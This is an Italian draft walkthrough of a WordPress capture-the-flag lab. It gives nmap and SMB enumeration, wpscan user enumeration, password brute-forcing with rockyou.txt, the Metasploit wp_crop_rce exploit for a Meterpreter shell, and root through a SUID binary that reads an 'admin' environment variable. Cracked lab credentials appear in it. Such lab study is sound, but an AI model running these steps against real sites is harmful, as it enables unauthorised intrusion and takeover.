@@ -1,0 +1,134 @@
+1. aggiungo blog.thm a
+nano /etc/hosts
+**perchè**
+
+2. vado sul sito e do un'occhiata, vedo che è WordPress, do un'occhio a robots.txt,
+vedo disallow wp-admin, dopo ci guardo, tanto non ho credenziali al momento.
+
+Poi faccio un consueto scan con
+nmap -sV -sC -A 10.10.186.187
+
+oltre la 80 trovo la 22, ma non ho credenziali al momento
+
+trovo un servizio smb, uso uno script nmap per saperne di più
+
+nmap --script smb-enum-shares 10.80.178.16
+
+
+3. aggiorno wpscan (ricorda di inserire il token)
+wpscan --update
+
+poi eseguo un
+wpscan --url http://10.80.128.91 -e vp,vt --plugins-detection aggressive -v 
+poi
+wpscan --url http://10.80.128.91 -e u
+
+e scopro due possibili nome utente 
+
+
+**perchè**
+
+
+
+4. quindi, apro owasp zap, inserisco l'ip in manual explore, cerco la pagina di login e provo a entrare con delle credenziali volutamente sbagliate (user e pass per comodità).
+
+5. poi vado nella History in owasp, cerco la post del login, click destro, attack->fuzz.
+Poi nel body della post, evidenzio prima user, clicco su add->add payload, aggiungo i due username trovati, clicco su ok.
+Poi faccio la stessa cosa con pass, però nel payload al posto di String seleziono File e navigo su /usr/share/wordlists/rockyou.txt
+Clicco su Add e lancio il fuzzer.
+
+6. Aspetto un po' e filtro per codice risposta, noterò che mi interessa la 302 (found), password trovata.
+
+6.1 Alternativamente posso prima crearmi un txt con gli username trovati 
+echo -e "kwheel\nbjoel" > user.txt
+e fare 
+wpscan --url http://blog.thm -P /usr/share/wordlists/rockyou.txt -U user.txt 
+
+
+7. Mi loggo a worpress e vedo che è un account senza privilegi admin, poco interessante.
+
+8. Avendo visto quindi che la versione di Wp è la 5.0, cerco su https://www.exploit-db.com/ e filtrando tra quelli confermati, trovo crop-image shell upload
+
+**spiegone**
+
+9. apro metasploit e cerco 
+search crop-image shell upload
+
+** spiegone metasploit **
+
+poi lo seleziono con 
+
+use 0 oppure use exploit/multi-http/wp_crop_rce
+
+poi apro un'altro terminale e guardo il mio ip con "ip a" mi interessa "eth0->inet" (forse non serve)
+
+poi show options per vedere che parametri mi servono. Noto che il payload prende automaticamente il mio ip contattandomi sulla porta 4444
+
+poi setto i parametri necessari
+
+set rhosts 10.80.178.16
+set username kwheel
+set password cutiepie1
+
+e poi exploit, attendo l'apertura di meterpreter **spiegone su meterpreter**
+
+chiedo una shell, viene creato un canale, attendo...
+
+poi siccome così com'è non sono dotato di una linea di comando **spiegare perchè**, lancio
+
+python -c 'import pty; pty.spawn("/bin/bash")' ** spiegare perchè**
+
+faccio pwd, vedo che sono nella cartella /var/www/wordpress
+cerco un po' in giro, finchè sotto home trovo /home/bjoel/user.txt, ma niente di interessante li, ma noto Billy_Joel_Termination_May20-2020.pdf.
+
+Per scaricarlo, faccio ctrl+c e premo Y per chiudere il canale. 
+
+Poi da meterpreter faccio download /home/bjoel/Billy_Joel_Termination_May20-2020.pdf
+
+e leggo in /root il contenuto del file scaricato.
+
+Leggo che Bill Joel è un ex dipendente della Rubber Ducky Inc, potrebbe essere un indizio, teniamolo a mente.
+
+riancio la shell, e di nuovo python -c 'import pty; pty.spawn("/bin/bash")'
+
+faccio l'enumerazione dei possibili permessi che potrebbero aiuterci in una privilege escalation con
+
+find / -perm -u=s -type f 2>/dev/null **spiegare cosa sto facendo**
+
+trovo quindi /usr/sbin/checker **spiegare cos'è e perché mi interessa**, provo a lanciarlo per capire i privilegi attuali, restituisce "Not an Admin", che posso fare?
+
+Visto che checker è un binario compilato,  dovrei ispezionarlo. Esco dal channel, lo scarico,
+e ora lo analizzo con ghidra **spiegone su cos'è ghidra**:
+
+creo un nuovo progetto, aggiungo /checker al progetto, apro con CodeBrowser, lancio Analyze.
+
+In Symbol Tree vado in Functions e vedo se mi ha identificato il main, si!
+
+Esaminando il codice all'interno della funzione principale, si può notare che il codice dichiara una variabile che controlla la variabile d'ambiente per il valore di admin. Se all'amministratore non viene assegnato alcun valore, il codice restituisce all'utente la stringa "Non è un amministratore". Se invece rileva un valore per l'amministratore, procede a invocare la shell bash. Poiché questo binario può essere eseguito con privilegi di root, la shell bash che invoca è quella dell'utente root stesso. 
+
+**spiegare meglio**
+
+Legge la variabile d’ambiente chiamata admin
+
+Se NON esiste → stampa “Not an Admin”
+
+Se esiste → fa setuid(0) (diventa root)
+→ lancia /bin/bash come root
+
+
+Quindi, torno su meterpreter e uso la solita shell python.
+
+Vado nella root e setto export admin=1 **spiegare perchè**
+
+Lancio /usr/sbin/checker e voilà, divento root
+
+Ora posso cercare root.txt, quindi cerco un po' in giro e trovo la flag root.
+
+Ora mi manca la flag di user, cerco con
+find / -name "user.txt"
+
+Ne trovo una su /media/usb/user.txt, faccio cat e trovo l'ultima flag!
+
+
+
+
